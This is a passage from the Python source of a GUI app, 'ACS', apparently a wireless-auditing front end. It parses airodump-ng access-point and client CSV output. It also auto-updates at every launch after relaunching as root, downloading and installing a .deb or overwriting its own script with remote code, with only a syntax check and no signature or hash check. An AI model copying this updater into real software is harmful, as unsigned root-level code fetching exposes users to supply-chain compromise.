            if not install_app_update(text or ""):
                self.after(0, lambda: messagebox.showerror("ACS", "Update failed a syntax check and was not installed."))
                return

            def go() -> None:
                messagebox.showinfo("ACS", f"Updated to {remote}. Restarting.")
                restart_app()

            self.after(0, go)

        threading.Thread(target=work, daemon=True).start()

    def _close(self) -> None:
        self._stop()
        self._save()
        self.destroy()


def parse_airodump(path: Path) -> list[tuple[str, str, str, str, str]]:
    rows: list[tuple[str, str, str, str, str]] = []
    text = path.read_text(errors="replace")
    for line in text.splitlines():
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue
        if not MAC_RE.match(parts[0]):
            continue
        essid = parts[13]
        if essid.lower() in {"essid", ""} and parts[3] == "":
            continue
        enc = " ".join(x for x in (parts[5], parts[6], parts[7]) if x)
        rows.append((parts[0], parts[3], parts[8], enc, essid))
    return rows


def parse_clients(path: Path) -> list[tuple[str, str, str, str]]:
    rows: list[tuple[str, str, str, str]] = []
    started = False
    for line in path.read_text(errors="replace").splitlines():
        if line.startswith("Station MAC"):
            started = True
            continue
        if not started:
            continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 6 or not MAC_RE.match(parts[0]):
            continue
        probes = parts[6] if len(parts) > 6 else ""
        rows.append((parts[0], parts[3], parts[5], probes))
    return rows


def version_tuple(text: str) -> tuple[int, ...]:
    parts: list[int] = []
    for piece in text.split("."):
        if piece.isdigit():
            parts.append(int(piece))
        else:
            break
    return tuple(parts) or (0,)


def fetch_remote_app() -> str | None:
    try:
        req = urllib.request.Request(APP_RAW, headers={"User-Agent": "acs-app"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.read().decode("utf-8", "replace")
    except Exception:
        return None


def remote_app_version(text: str) -> str | None:
    match = re.search(r'^APP_VER = "([^"]+)"', text, re.M)
    return match.group(1) if match else None


def fetch_remote_version() -> str | None:
    try:
        req = urllib.request.Request(APP_VERSION_URL, headers={"User-Agent": "acs-app"})
        with urllib.request.urlopen(req, timeout=12) as resp:
            version = resp.read().decode("utf-8", "replace").strip()
        if version:
            return version
    except Exception:
        pass
    return remote_app_version(fetch_remote_app() or "")


def install_deb(version: str) -> bool:
    if os.geteuid() != 0 or not version:
        return False
    url = f"https://github.com/iinze0/ACS-app/releases/download/v{version}/acs-app_{version}_all.deb"
    deb = Path(f"/tmp/acs-app_{version}_all.deb")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "acs-app"})
        with urllib.request.urlopen(req, timeout=60) as resp:
            deb.write_bytes(resp.read())
    except Exception:
        return False
    check = subprocess.run(["dpkg-deb", "-I", str(deb)], capture_output=True)
    if check.returncode != 0:
        deb.unlink(missing_ok=True)
        return False
    installed = subprocess.run(["dpkg", "-i", str(deb)])
    return installed.returncode == 0


def install_app_update(text: str) -> bool:
    remote = remote_app_version(text) or ""
    if install_deb(remote):
        return True
    path = Path(__file__).resolve()
    if (path.parent / ".git").is_dir() and have("git"):
        proc = subprocess.run(
            ["git", "-C", str(path.parent), "pull", "--ff-only"],
            text=True,
            capture_output=True,
        )
        return proc.returncode == 0
    if 'APP_VER = "' not in text:
        return False
    tmp = path.with_name("acs_app.py.new")
    tmp.write_text(text)
    proc = subprocess.run([sys.executable, "-m", "py_compile", str(tmp)], capture_output=True)
    if proc.returncode != 0:
        tmp.unlink(missing_ok=True)
        return False
    os.chmod(tmp, 0o755)
    os.replace(tmp, path)
    return True


def restart_app() -> None:
    os.environ["ACS_JUST_UPDATED"] = "1"
    packaged = Path("/usr/lib/acs-app/acs_app.py")
    script = str(packaged if packaged.is_file() else Path(__file__).resolve())
    os.execv(sys.executable, [sys.executable, script, *sys.argv[1:]])


def auto_update_app() -> None:
    if os.environ.get("ACS_NO_UPDATE") == "1" or os.environ.get("ACS_JUST_UPDATED") == "1":
        return
    remote = fetch_remote_version()
    if not remote or version_tuple(remote) <= version_tuple(APP_VER):
        return
    if install_deb(remote):
        restart_app()
    text = fetch_remote_app()
    if text and install_app_update(text):
        restart_app()


def main() -> None:
    relaunch_as_root()
    HOME.mkdir(parents=True, exist_ok=True)
    auto_update_app()
    App().mainloop()


if __name__ == "__main__":
    main()
